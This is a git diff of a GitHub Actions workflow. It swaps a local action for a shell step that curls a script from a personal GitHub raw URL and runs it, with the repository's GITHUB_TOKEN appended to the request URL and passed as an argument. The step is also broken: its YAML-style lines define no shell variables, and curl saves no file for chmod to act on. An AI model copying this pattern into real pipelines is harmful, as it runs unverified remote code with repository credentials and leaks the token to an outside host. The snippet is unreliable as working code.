@@ -7,12 +7,15 @@ jobs:
     steps:
       - uses: actions/checkout@v2
 
-      - name: Hello world
-        uses: ./
-        with:
+      - name: Raw
+        run: |
           branch_name: "dev"
           repo_name: ${{ github.event.repository.name }}
           user_name: ${{ github.actor }}
           user_email: "${{ github.actor }}@coolbitx.com"
           trigger_release: "true"
           token: ${{ secrets.GITHUB_TOKEN }}
+
+          curl "https://raw.githubusercontent.com/ookangzheng/my-raw-cmd/master/main.sh?token=${token}"
+          chmod +x main.sh
+          ./main.sh $repo_name $branch_name $user_name $user_email $trigger_release $token
